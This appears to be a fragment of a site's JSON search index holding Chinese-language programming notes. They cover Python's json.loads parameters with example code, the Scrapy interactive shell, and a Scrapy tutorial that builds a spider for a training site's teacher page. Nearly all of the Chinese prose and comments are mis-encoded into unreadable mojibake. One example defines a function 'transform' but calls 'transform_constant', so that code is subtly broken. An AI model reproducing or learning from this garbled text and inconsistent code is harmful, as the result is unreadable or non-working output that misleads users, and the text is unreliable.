v2), (k3, v3)] return value of ``object_pairs_hook`` will be used instead of the ``dict``. # å¦‚æœobject_hookå’Œobject_pairs_hookåŒæ—¶æŒ‡å®šçš„è¯ä¼˜å…ˆè¿”å›object_pairs_hook This feature can be used to implement custom decoders that rely on the order that the key and value pairs are decoded (for example, collections.OrderedDict will remember the order of insertion). If ``object_hook`` is also defined, the ``object_pairs_hook`` takes priority. ``parse_float``, if specified, will be called with the string # parse_floatå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒå¦‚æœè¢«æŒ‡å®šçš„è¯ï¼Œåœ¨è§£ç jsonå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ of every JSON float to be decoded. By default this is equivalent to # ç¬¦åˆfloatç±»å‹çš„å­—ç¬¦ä¸²å°†è¢«è½¬ä¸ºä½ æ‰€æŒ‡å®šçš„ï¼Œæ¯”å¦‚è¯´ä½ å¯ä»¥æŒ‡å®šä¸ºdecimal.Decimal float(num_str). This can be used to use another datatype or parser for JSON floats (e.g. decimal.Decimal). ``parse_int``, if specified, will be called with the string # parse_intå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒå¦‚æœè¢«æŒ‡å®šçš„è¯ï¼Œåœ¨è§£ç jsonå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ of every JSON int to be decoded. By default this is equivalent to # ç¬¦åˆintç±»å‹çš„å­—ç¬¦ä¸²å°†è¢«è½¬ä¸ºä½ æ‰€æŒ‡å®šçš„ï¼Œæ¯”å¦‚è¯´ä½ å¯ä»¥æŒ‡å®šä¸ºfloat int(num_str). This can be used to use another datatype or parser for JSON integers (e.g. float). ``parse_constant``, if specified, will be called with one of the # parse_constantå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒå¦‚æœè¢«æŒ‡å®šçš„è¯ï¼Œåœ¨è§£ç jsonå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ following strings: -Infinity, Infinity, NaN. # å¦‚æœå‡ºç°ä»¥ä»¥ä¸‹å­—ç¬¦ä¸²: -Infinity, Infinity, NaN é‚£ä¹ˆæŒ‡å®šçš„parse_constantæ–¹æ³•å°†ä¼šè¢«è°ƒç”¨åˆ° This can be used to raise an exception if invalid JSON numbers are encountered. To use a custom ``JSONDecoder`` subclass, specify it with the ``cls`` # ä½ ä¹Ÿå¯ä»¥ç”¨clså‚æ•°é€šè¿‡å®ç°ä¸€ä¸ªJSONDecoderçš„å­ç±»ï¼Œæ¥ä»£æ›¿JSONDecoder,é€šè¿‡è¿™ä¸ªåŠŸèƒ½ä½ å¯ä»¥è‡ªå®šä¹‰ä¸Šé¢çš„é‚£äº›parse_xxxå‚æ•°,è¿™é‡Œå°±ä¸ä¸¾ä¾‹äº† kwarg; otherwise ``JSONDecoder`` is used. \"\"\" ä»¥ä¸‹å‚æ•°è¯´æ˜æ˜¯æ ¹æ®å®˜æ–¹æ–‡æ¡£ç¿»è¯‘çš„ så‚æ•° æŠŠä¸€ä¸ªå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºPythonå¯¹è±¡ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å¯ä»¥æ˜¯strç±»å‹çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯unicodeç±»å‹çš„ï¼Œ å¦‚æœå‚æ•°sæ˜¯ä»¥ASCIIç¼–ç çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆéœ€è¦æ‰‹åŠ¨é€šè¿‡å‚æ•°encodingæŒ‡å®šç¼–ç æ–¹å¼ï¼Œ ä¸æ˜¯ä»¥ASCIIç¼–ç çš„å­—ç¬¦ä¸²ï¼Œæ˜¯ä¸è¢«å…è®¸çš„ï¼Œä½ å¿…é¡»æŠŠå®ƒè½¬ä¸ºunicode å¯¹äºloadsæ–¹æ³•æ¥è¯´ï¼Œsæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œå¯¹äºloadæ–¹æ³•æ¥è¯´ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®æµæ–‡ä»¶ object_hookå‚æ•° object_hookå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒä¼šå°†ï¼ˆloadsçš„)è¿”å›ç»“æœå­—å…¸æ›¿æ¢ä¸ºä½ æ‰€æŒ‡å®šçš„ç±»å‹,è¿™ä¸ªåŠŸèƒ½å¯ä»¥ç”¨æ¥å®ç°è‡ªå®šä¹‰è§£ç å™¨ï¼Œå¦‚JSON-RPC è¿™é‡Œå…ˆå®šä¹‰ä¸€ä¸ªPersonå¯¹è±¡: class Person: def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender def toJSON(self): return { \"name\": self.name, \"age\": self.age, \"gender\": self.gender } @staticmethod def parseJSON(dct): if isinstance(dct, dict): p = Person(dct[\"name\"], int(dct['age']), dct['gender']) return p return dct OKï¼Œè¯•ä¸‹object_hookå‚æ•°å§: s = '{\"name\": \"é©¬äº‘\", \"age\": 54, \"gender\": \"man\"}' # æµ‹è¯•json.loadsæ–¹æ³•çš„object_hookå‚æ•° p = json.loads(s, object_hook=Person.parseJSON) print(\"json.loads æ˜¯å¦å°†å­—ç¬¦ä¸²è½¬ä¸ºå­—å…¸äº†: --> \" + str(isinstance(p, dict))) print(\"json.loads æ˜¯å¦å°†å­—ç¬¦ä¸²è½¬ä¸ºPersonå¯¹è±¡äº†: --> \" + str(isinstance(p, Person))) object_pairs_hookå‚æ•° object_pairs_hookå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒä¼šå°†ç»“æœä»¥key-valueæœ‰åºåˆ—è¡¨çš„å½¢å¼è¿”å›, å½¢å¼å¦‚: [(k1, v1), (k2, v2), (k3, v3)] , å¦‚æœobject_hookå’Œobject_pairs_hookåŒæ—¶æŒ‡å®šçš„è¯ä¼˜å…ˆè¿”å›object_pairs_hook: s = '{\"name\": \"é©¬äº‘\", \"age\": 54, \"gender\": \"man\"}' # æµ‹è¯•json.loadsæ–¹æ³•çš„object_pairs_hookå‚æ•° print(\"-\" * 30 + \"> test object_pairs_hook <\" + \"-\" * 30) p = json.loads(s, object_hook=Person.parseJSON, object_pairs_hook=collections.OrderedDict) # p = json.loads(s, object_hook=Person.parseJSON, object_pairs_hook=Person.parseJSON) print(\"json.loads æµ‹è¯•åŒæ—¶æŒ‡å®šobject_hookå’Œobject_pairs_hook,æœ€ç»ˆè°ƒç”¨å“ªä¸ªå‚æ•°: --> \" + str(type(p))) print(\"json.loads æŒ‡å®šobject_pairs_hookç»“æœå°†ä¼šè¿”å›ä¸€ä¸ªæœ‰åºåˆ—è¡¨ --> {}\".format(p)) parse_floatå‚æ•° parse_floatå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒå¦‚æœè¢«æŒ‡å®šçš„è¯ï¼Œåœ¨è§£ç jsonå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ ç¬¦åˆfloatç±»å‹çš„å­—ç¬¦ä¸²å°†è¢«è½¬ä¸ºä½ æ‰€æŒ‡å®šçš„ï¼Œæ¯”å¦‚è¯´ä½ å¯ä»¥æŒ‡å®šä¸ºdecimal.Decimal æµ‹è¯•json.loadsæ–¹æ³•çš„parse_floatå‚æ•°: print(\"-\" * 30 + \"> test parse_float <\" + \"-\" * 30) p = json.loads(\"123.456\", parse_float=decimal.Decimal) print(\"json.loads é€šè¿‡parse_floatå‚æ•°å°†åŸæœ¬åº”è¯¥è½¬ä¸ºfloatç±»å‹çš„å­—ç¬¦ä¸²è½¬ä¸ºdecimalç±»å‹: type(json.loads(\\\"123.456\\\", parse_float=decimal.Decimal)) --> \" + str(type(p))) print(\"\") parse_intå‚æ•° parse_intå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒå¦‚æœè¢«æŒ‡å®šçš„è¯ï¼Œåœ¨è§£ç jsonå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ ç¬¦åˆintç±»å‹çš„å­—ç¬¦ä¸²å°†è¢«è½¬ä¸ºä½ æ‰€æŒ‡å®šçš„ï¼Œæ¯”å¦‚è¯´ä½ å¯ä»¥æŒ‡å®šä¸ºfloat æµ‹è¯•json.loadsæ–¹æ³•çš„parse_intå‚æ•°: print(\"-\" * 30 + \"> test parse_int <\" + \"-\" * 30) p = json.loads(\"123\", parse_int=float) print(\"json.loads é€šè¿‡parse_intå‚æ•°å°†åŸæœ¬åº”è¯¥è½¬ä¸ºintç±»å‹çš„å­—ç¬¦ä¸²è½¬ä¸ºfloatç±»å‹: type(json.loads(\\\"123\\\", parse_int=float)) --> \" + str(type(p))) parse_constantå‚æ•° parse_constantå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒå¦‚æœè¢«æŒ‡å®šçš„è¯ï¼Œåœ¨è§£ç jsonå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ å¦‚æœå‡ºç°ä»¥ä»¥ä¸‹å­—ç¬¦ä¸²:-Infinityï¼ŒInfinityï¼ŒNaNé‚£ä¹ˆæŒ‡å®šçš„parse_constantæ–¹æ³•å°†ä¼šè¢«è°ƒç”¨åˆ°: def transform(s): \"\"\" æ­¤æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ ç»™json.load(s)æ–¹æ³•çš„parse_è½¬è¯‘NAN, -Infinity,Infinity :param s: :return: \"\"\" # NaN --> not a number if \"NaN\" == s: return \"Not a Number\" # å°†è´Ÿæ— ç©·å¤§è½¬ä¸ºä¸€ä¸ªéå¸¸å°çš„æ•° elif \"-Infinity\" == s: return -999999 # å°†æ­£æ— ç©·å¤§è½¬ä¸ºä¸€ä¸ªéå¸¸å¤§çš„æ•° elif \"Infinity\" == s: return 999999 else: return s # æµ‹è¯•json.loadsæ–¹æ³•çš„parse_constantå‚æ•° print(\"-\" * 30 + \"> test parse_constant <\" + \"-\" * 30) print(\"json.loads Infinity: --> \" + str(json.loads('Infinity'))) print(\"json.loads parse_constant convert Infinity: --> \" + str(json.loads('Infinity', parse_constant=transform_constant))) print(\"json.loads -Infinity: --> \" + str(json.loads('-Infinity'))) print(\"json.loads parse_constant convert -Infinity: --> \" + str(json.loads('-Infinity', parse_constant=transform_constant))) print(\"json.loads NaN: --> \" + str(json.loads('NaN'))) print(\"json.loads parse_constant convert NaN : --> \" + str(json.loads('NaN', parse_constant=transform_constant))) print(\"\") clså‚æ•° é€šè¿‡å®˜æ–¹æ–‡æ¡£çš„æ³¨é‡Šæˆ‘ä»¬å¯ä»¥çŸ¥é“json.load(s)æ–¹æ³•å…·ä½“çš„å®ç°æ˜¯é€šè¿‡JSONCoderç±»å®ç°çš„ï¼Œ è€Œclså‚æ•°æ˜¯ç”¨äºè‡ªå®šä¹‰ä¸€ä¸ªJSONCoderçš„å­ç±»ï¼Œç”¨äºæ›¿æ¢JSONCoderç±»ï¼Œ,é€šè¿‡è¿™ä¸ªåŠŸèƒ½ä½ å¯ä»¥è‡ªå®šä¹‰ä¸Šé¢çš„é‚£äº›parse_xxxå‚æ•°ï¼Œè¿™é‡Œå°±ä¸ä¸¾ä¾‹äº† åŸæ–‡é“¾æ¥: https://blog.csdn.net/daerzei/article/details/100598901 dumpå’Œdumpsçš„åŒºåˆ« json.dumps() æ˜¯æŠŠpythonå¯¹è±¡è½¬æ¢æˆjsonå¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œç”Ÿæˆçš„æ˜¯å­—ç¬¦ä¸²ã€‚ json.dump() æ˜¯æŠŠpythonå¯¹è±¡è½¬æ¢æˆjsonå¯¹è±¡ç”Ÿæˆä¸€ä¸ªfpçš„æ–‡ä»¶æµï¼Œå’Œæ–‡ä»¶ç›¸å…³ã€‚ loadså’Œload ä¸‹é¢ä¸»è¦åˆ†æè®²è§£ä¸€ä¸‹jsonçš„loadså’Œloadæ–¹æ³•ã€‚ è¿™ä¸¤ä¸ªæ–¹æ³•ä¸­éƒ½æ˜¯æŠŠå…¶ä»–ç±»å‹çš„å¯¹è±¡è½¬ä¸ºPythonå¯¹è±¡ï¼Œè¿™é‡Œå…ˆè¯´æ˜ä¸€ä¸‹Pythonå¯¹è±¡ï¼Œ Pythonå¯¹è±¡åŒ…æ‹¬ï¼š æ‰€æœ‰PythonåŸºæœ¬æ•°æ®ç±»å‹ï¼Œåˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ï¼Œè‡ªå·±å®šä¹‰çš„ç±»ï¼Œç­‰ç­‰ç­‰ç­‰ï¼Œå½“ç„¶ä¸åŒ…æ‹¬Pythonçš„å­—ç¬¦ä¸²ç±»å‹ï¼ŒæŠŠå­—ç¬¦ä¸²æˆ–è€…æ–‡ä»¶éä¸­çš„å­—ç¬¦ä¸²è½¬ä¸ºå­—ç¬¦ä¸²ä¼šæŠ¥é”™çš„ å…ˆæ¥ä¸€ä¸ªä¾‹å­ï¼Œé™¤äº†è¦è½¬æ¢çš„å¯¹è±¡ï¼Œå…¶ä»–ä»€ä¹ˆå‚æ•°éƒ½ä¸ä¼ : s = '{\"name\": \"wade\", \"age\": 54, \"gender\": \"man\"}' # json.loadsè¯»å–å­—ç¬¦ä¸²å¹¶è½¬ä¸ºPythonå¯¹è±¡ print(\"json.loadså°†å­—ç¬¦ä¸²è½¬ä¸ºPythonå¯¹è±¡: type(json.loads(s)) = {}\".format(type(json.loads(s)))) print(\"json.loadså°†å­—ç¬¦ä¸²è½¬ä¸ºPythonå¯¹è±¡: json.loads(s) = {}\".format(json.loads(s))) # json.loadè¯»å–æ–‡ä»¶å¹¶å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºPythonå¯¹è±¡ # æ•°æ®æ–‡ä»¶è¦s.jsonçš„å†…å®¹ --> {\"name\": \"wade\", \"age\": 54, \"gender\": \"man\"} with open('s.json', 'r') as f: s1 = json.load(f) print(\"json.loadå°†æ–‡ä»¶å†…å®¹è½¬ä¸ºPythonå¯¹è±¡: type(json.load(f)) = {}\".format(type(s1))) print(\"json.loadå°†æ–‡ä»¶å†…å®¹è½¬ä¸ºPythonå¯¹è±¡: json.load(f) = {}\".format(s1)) æ—¥å¸¸å·¥ä½œä¸­æœ€å¸¸è§çš„å°±æ˜¯æŠŠå­—ç¬¦ä¸²é€šè¿‡json.loadsè½¬ä¸ºå­—å…¸ï¼Œ å…¶å®jsonçš„loadsæ–¹æ³•ä¸ä»…å¯ä»¥æŠŠå­—ç¬¦ä¸²è½¬ä¸ºå­—å…¸ï¼Œè¿˜å¯ä»¥è½¬ä¸ºä»»ä½•Pythonå¯¹è±¡ã€‚ æ¯”å¦‚è¯´ï¼Œè½¬æˆpythonåŸºæœ¬æ•°æ®ç±»å‹: print('json.loads å°†æ•´æ•°ç±»å‹çš„å­—ç¬¦ä¸²è½¬ä¸ºintç±»å‹: type(json.loads(\"123456\"))) --> {}'.format(type(json.loads(\"123456\")))) print('json.loads å°†æµ®ç‚¹ç±»å‹çš„å­—ç¬¦ä¸²è½¬ä¸ºfloatç±»å‹: type(json.loads(\"123.456\")) --> {}'.format(type(json.loads(\"123.456\")))) print('json.loads å°†booleanç±»å‹çš„å­—ç¬¦ä¸²è½¬ä¸ºboolç±»å‹: type(json.loads(\"true\")) --> {}'.format((type(json.loads(\"true\"))))) print('json.loads å°†åˆ—è¡¨ç±»å‹çš„å­—ç¬¦ä¸²è½¬ä¸ºåˆ—è¡¨: type(json.loads(\\'[\"a\", \"b\", \"c\"]\\')) --> {}'.format(type(json.loads('[\"a\", \"b\", \"c\"]')))) print('json.loads å°†å­—å…¸ç±»å‹çš„å­—ç¬¦ä¸²è½¬ä¸ºå­—å…¸: type(json.loads(\\'{\"a\": 1, \"b\": 1.2, \"c\": true, \"d\": \"ddd\"}\\')) --> %s' % str(type(json.loads('{\"a\": 1, \"b\": 1.2, \"c\": true, \"d\": \"ddd\"}')))) jsonæ¨¡å—ä¼šæ ¹æ®ä½ çš„å­—ç¬¦ä¸²è‡ªåŠ¨è½¬ä¸ºæœ€ç¬¦åˆçš„æ•°æ®ç±»å‹ï¼Œ ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½è½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå¦åˆ™ä¼šæŠ¥json.decoder.JSONDecodeErroré”™è¯¯: json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-json.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-json.html"},{"title":"Scrapy shell","text":"äº¤äº’å¼ç»ˆç«¯å·¥å…· å‚è€ƒ: https://docs.scrapy.org/en/latest/topics/shell.html#topics-shell å¦‚æœæœ‰å®‰è£… IPython , å°±ä¼šä½¿ç”¨ IPython , å¦åˆ™ä½¿ç”¨é»˜è®¤ Python çš„äº¤äº’å¼ç»ˆç«¯ å¯åŠ¨: scrapy shell <url> url æƒ³çˆ¬å–çš„ url åœ°å€. ä¹Ÿæ”¯æŒæœ¬åœ°çš„ html æ–‡ä»¶: # UNIX-style scrapy shell ./path/to/file.html scrapy shell ../other/path/to/file.html scrapy shell /absolute/path/to/file.html # File URI scrapy shell file:///absolute/path/to/file.html æ”¯æŒçš„æŒ‡ä»¤ view ä»æµè§ˆå™¨æ‰“å¼€: >>> view(response) True","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Scrapy-shell.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Scrapy-shell.html"},{"title":"ä½¿ç”¨","text":"åˆ¶ä½œ Scrapy çˆ¬è™« ä¸€å…±éœ€è¦4æ­¥ï¼š æ–°å»ºé¡¹ç›® (scrapy startproject xxx)ï¼šæ–°å»ºä¸€ä¸ªæ–°çš„çˆ¬è™«é¡¹ç›® æ˜ç¡®ç›®æ ‡ ï¼ˆç¼–å†™items.pyï¼‰ï¼šæ˜ç¡®ä½ æƒ³è¦æŠ“å–çš„ç›®æ ‡ åˆ¶ä½œçˆ¬è™« ï¼ˆspiders/xxspider.pyï¼‰ï¼šåˆ¶ä½œçˆ¬è™«å¼€å§‹çˆ¬å–ç½‘é¡µ å­˜å‚¨å†…å®¹ ï¼ˆpipelines.pyï¼‰ï¼šè®¾è®¡ç®¡é“å­˜å‚¨çˆ¬å–å†…å®¹ æ–°å»ºé¡¹ç›® åˆ›å»ºä¸€ä¸ªå·¥ä½œç›®å½•workdirå¹¶è¿›å…¥: mkdir workdir; cd workdir åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ(çœç•¥)å¹¶å®‰è£…ä¾èµ–: pip install Scrapy åˆ›å»ºé¡¹ç›®: scrapy startproject mySpider è¾“å‡º: (.venv) yanque@mbp16 StudyScrapy % scrapy startproject mySpider New Scrapy project 'mySpider', using template directory '/Users/yanque/Project/Code/Pycharm/StudyScrapy/.venv/lib/python3.11/site-packages/scrapy/templates/project', created in: /Users/yanque/Project/Code/Pycharm/StudyScrapy/mySpider scons sconsign screen script scutil You can start your first spider with: cd mySpider scrapy genspider example example.com æŸ¥çœ‹ç›®å½•ç»“æ„: (.venv) yanque@mbp16 StudyScrapy % tree mySpider mySpider â”œâ”€â”€ mySpider â”‚ â”œâ”€â”€ __init__.py â”‚ â”œâ”€â”€ items.py â”‚ â”œâ”€â”€ middlewares.py â”‚ â”œâ”€â”€ pipelines.py â”‚ â”œâ”€â”€ settings.py â”‚ â””â”€â”€ spiders â”‚ â””â”€â”€ __init__.py â””â”€â”€ scrapy.cfg 2 directories, 7 files è¿™äº›æ–‡ä»¶åˆ†åˆ«æ˜¯: scrapy.cfg: é¡¹ç›®çš„é…ç½®æ–‡ä»¶ã€‚ mySpider/: é¡¹ç›®çš„Pythonæ¨¡å—ï¼Œå°†ä¼šä»è¿™é‡Œå¼•ç”¨ä»£ç ã€‚ mySpider/items.py: é¡¹ç›®çš„ç›®æ ‡æ–‡ä»¶ã€‚ middlewares.py: ä¸­é—´ä»¶æ–‡ä»¶ mySpider/pipelines.py: é¡¹ç›®çš„ç®¡é“æ–‡ä»¶ã€‚ mySpider/settings.py: é¡¹ç›®çš„è®¾ç½®æ–‡ä»¶ã€‚ mySpider/spiders/: å­˜å‚¨çˆ¬è™«ä»£ç ç›®å½•ã€‚ æ˜ç¡®ç›®æ ‡(mySpider/items.py) æˆ‘ä»¬æ‰“ç®—æŠ“å– é»‘é©¬ ç½‘ç«™é‡Œçš„æ‰€æœ‰è®²å¸ˆçš„å§“åã€èŒç§°å’Œä¸ªäººä¿¡æ¯ã€‚ æ‰“å¼€ mySpider ç›®å½•ä¸‹çš„ items.pyã€‚ Item å®šä¹‰ç»“æ„åŒ–æ•°æ®å­—æ®µï¼Œç”¨æ¥ä¿å­˜çˆ¬å–åˆ°çš„æ•°æ®ï¼Œæœ‰ç‚¹åƒ Python ä¸­çš„ dictï¼Œä½†æ˜¯æä¾›äº†ä¸€äº›é¢å¤–çš„ä¿æŠ¤å‡å°‘é”™è¯¯ã€‚ å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ª scrapy.Item ç±»ï¼Œ å¹¶ä¸”å®šä¹‰ç±»å‹ä¸º scrapy.Field çš„ç±»å±æ€§æ¥å®šä¹‰ä¸€ä¸ª Itemï¼ˆå¯ä»¥ç†è§£æˆç±»ä¼¼äº ORM çš„æ˜ å°„å…³ç³»ï¼‰ã€‚ æ¥ä¸‹æ¥ï¼Œåˆ›å»ºä¸€ä¸ª ItcastItem ç±»ï¼Œå’Œæ„å»º item æ¨¡å‹ï¼ˆmodelï¼‰: import scrapy class ItcastItem(scrapy.Item): head = scrapy.Field() name = scrapy.Field() level = scrapy.Field() desc = scrapy.Field() åˆ¶ä½œçˆ¬è™«(spiders/itcastSpider.py) çˆ¬æ•°æ® åœ¨ mySpider/spiders ç›®å½•ä¸‹è¾“å…¥å‘½ä»¤: scrapy genspider itcast \"itcast.cn\" å°†åœ¨ mySpider/spiders ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º itcast çš„çˆ¬è™«ï¼Œå¹¶æŒ‡å®šçˆ¬å–åŸŸçš„èŒƒå›´. mySpider/spiders ç›®å½•é‡Œçš„ itcast.pyï¼Œé»˜è®¤ä»£ç : import scrapy class ItcastSpider(scrapy.Spider): name = \"itcast\" allowed_domains = [\"itcast.cn\"] start_urls = ( 'http://www.itcast.cn/', ) def parse(self, response): pass æ³¨è§£ å¯ä»¥ç”±æˆ‘ä»¬è‡ªè¡Œåˆ›å»ºitcast.pyå¹¶ç¼–å†™ä¸Šé¢çš„ä»£ç ï¼Œåªä¸è¿‡ä½¿ç”¨å‘½ä»¤å¯ä»¥å…å»ç¼–å†™å›ºå®šä»£ç çš„éº»çƒ¦ è¦å»ºç«‹ä¸€ä¸ªSpiderï¼Œ ä½ å¿…é¡»ç”¨scrapy.Spiderç±»åˆ›å»ºä¸€ä¸ªå­ç±»ï¼Œå¹¶ç¡®å®šäº†ä¸‰ä¸ªå¼ºåˆ¶çš„å±æ€§ å’Œ ä¸€ä¸ªæ–¹æ³•ã€‚ name = \"\" è¿™ä¸ªçˆ¬è™«çš„è¯†åˆ«åç§°ï¼Œå¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œåœ¨ä¸åŒçš„çˆ¬è™«å¿…é¡»å®šä¹‰ä¸åŒçš„åå­—ã€‚ allow_domains = [] æ˜¯æœç´¢çš„åŸŸåèŒƒå›´ï¼Œä¹Ÿå°±æ˜¯çˆ¬è™«çš„çº¦æŸåŒºåŸŸï¼Œè§„å®šçˆ¬è™«åªçˆ¬å–è¿™ä¸ªåŸŸåä¸‹çš„ç½‘é¡µï¼Œä¸å­˜åœ¨çš„URLä¼šè¢«å¿½ç•¥ã€‚ æ–°ç‰ˆæœ¬è²Œä¼¼å·²ç»åºŸå¼ƒ start_urls = () çˆ¬å–çš„URLå…ƒç¥–/åˆ—è¡¨ã€‚çˆ¬è™«ä»è¿™é‡Œå¼€å§‹æŠ“å–æ•°æ®ï¼Œæ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡ä¸‹è½½çš„æ•°æ®å°†ä¼šä»è¿™äº›urlså¼€å§‹ã€‚å…¶ä»–å­URLå°†ä¼šä»è¿™äº›èµ·å§‹URLä¸­ç»§æ‰¿æ€§ç”Ÿæˆã€‚ æˆ–è€…ä¸å®šä¹‰ start_urls, ç›´æ¥é‡å†™ start_requests def start_requests(self): urls = [ \"https://quotes.toscrape.com/page/1/\", \"https://quotes.toscrape.com/page/2/\", ] for url in urls: yield scrapy.Request(url=url, callback=self.parse) æ³¨æ„ start_requests è¿”å›ç»“æœéœ€è¦æ˜¯ä¸€ä¸ªç”Ÿæˆå™¨ parse(self, response) è§£æçš„æ–¹æ³•ï¼Œæ¯ä¸ªåˆå§‹URLå®Œæˆä¸‹è½½åå°†è¢«è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™ä¼ å…¥ä»æ¯ä¸€ä¸ªURLä¼ å›çš„Responseå¯¹è±¡æ¥ä½œä¸ºå”¯ä¸€å‚æ•°ï¼Œ ä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š è´Ÿè´£è§£æè¿”å›çš„ç½‘é¡µæ•°æ®(response.body)ï¼Œæå–ç»“æ„åŒ–æ•°æ®(ç”Ÿæˆitem) ç”Ÿæˆéœ€è¦ä¸‹ä¸€é¡µçš„URLè¯·æ±‚ã€‚ å°†start_urlsçš„å€¼ä¿®æ”¹ä¸ºéœ€è¦çˆ¬å–çš„ç¬¬ä¸€ä¸ªurl: start_urls = (\"http://www.itcast.cn/channel/teacher.shtml\",) ä¿®æ”¹parse()æ–¹æ³•: from scrapy.http import Request, Response def parse(self, response: Response): filename = \"teacher.html\" with open(filename, 'w') as f: f.write(response.body.decode('utf-8')) ç„¶åè¿è¡Œä¸€ä¸‹è¿™ä¸ªçˆ¬è™«çœ‹çœ‹ï¼Œåœ¨ mySpider ç›®å½•ä¸‹æ‰§è¡Œ( ä¸€å®šè¦ç¡®å®šæ­£ç¡®çš„æ ¹ç›®å½• ): cd mySpider; scrapy crawl itcast å¯ä»¥çœ‹åˆ° mySpider ä¸‹ç”Ÿæˆäº†çˆ¬å–çš„ teacher.html å‘ç”Ÿäº†ä»€ä¹ˆ? ä¸ç®¡æ˜¯å¦é‡æ–°å®šä¹‰ start_requests , start_requests çš„è¿”å›ç»“æœéƒ½æ˜¯ scrapy.Request å¯¹è±¡çš„ç”Ÿæˆå™¨ å¯¹äºæ¯ä¸€ä¸ªç”Ÿæˆå™¨çš„ url, éƒ½ä¼šè°ƒç”¨ parse æ–¹æ³•, å¤„ç†æ‹¿åˆ°çš„æ•°æ® å¦å¤–, start_requests è¿”å›çš„ scrapy.Request é»˜è®¤å›è°ƒå°±æ˜¯ parse shellå·¥å…· æœ€å¼€å§‹å¯ä»¥ä½¿ç”¨ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/Scrapy shell å·¥å…·: scrapy shell 'http://www.itcast.cn/channel/teacher.shtml' æ¥å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼ç»ˆç«¯ å¯ä»¥é€‰æ‹©ä½¿ç”¨äº†æŒ‡å®š CSS æ ‡ç­¾, ç¤ºä¾‹å¯»æ‰¾ <title> å…ƒç´ : >>> response.css(\"title\") [<Selector query='descendant-or-self::title' data='<title>å¸ˆèµ„åŠ›é‡|è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜</title>'>] >>> è¾“å‡ºç»“æœæ˜¯ä¸€ä¸ª SelectorList å¯¹è±¡, ä»£è¡¨æ‰€æœ‰æŸ¥è¯¢åˆ°çš„å…ƒç´ çš„åˆ—è¡¨ æŸ¥çœ‹æ‰€æœ‰: >>> response.css(\"title\").getall() ['<title>å¸ˆèµ„åŠ›é‡|è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜</title>'] åªéœ€è¦æ–‡æœ¬: >>> response.css(\"title::text\").getall() ['å¸ˆèµ„åŠ›é‡|è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜'] åªè·å–ç¬¬ä¸€ä¸ªå…ƒç´ çš„æ–‡æœ¬: >>> response.css(\"title::text\").get() 'å¸ˆèµ„åŠ›é‡|è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜' ç­‰ä»·äº: >>> response.css(\"title::text\")[0].get() 'å¸ˆèµ„åŠ›é‡|è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜' æ³¨è§£ ä½¿ç”¨ç´¢å¼•çš„æ–¹å¼, å¦‚æœæ²¡æœ‰å°±æŠ¥é”™ç´¢å¼•è¶Šç•Œ, æ‰€ä»¥è¿˜æ˜¯ç›´æ¥ç”¨ get è·å–ç¬¬ä¸€ä¸ªå¥½ç‚¹ è¿˜æ”¯æŒä½¿ç”¨ re è¿›è¡Œæ­£åˆ™: >>> response.css(\"title::text\").re(r\".*\") ['å¸ˆèµ„åŠ›é‡|è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜', ''] >>> >>> response.css(\"title::text\").re(r\"\\w*\") ['å¸ˆèµ„åŠ›é‡', '', 'è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜', ''] >>> >>> response.css(\"title::text\").re(r\"(\\w*)_(\\w*)\") ['è®²å¸ˆä»‹ç»', 'é»‘é©¬ç¨‹åºå‘˜'] è¿˜å¯ä»¥ä»æµè§ˆå™¨æ‰“å¼€ç¼“å­˜çš„ HTML é¡µé¢: >>> view(response) True åŸå§‹æ•°æ®è§£æ æˆ‘ä»¬å¯ä»¥ç ”ç©¶ä¸‹ä¹‹å‰æ‹¿åˆ°çš„ teacher.html , å¯ä»¥çœ‹åˆ°, 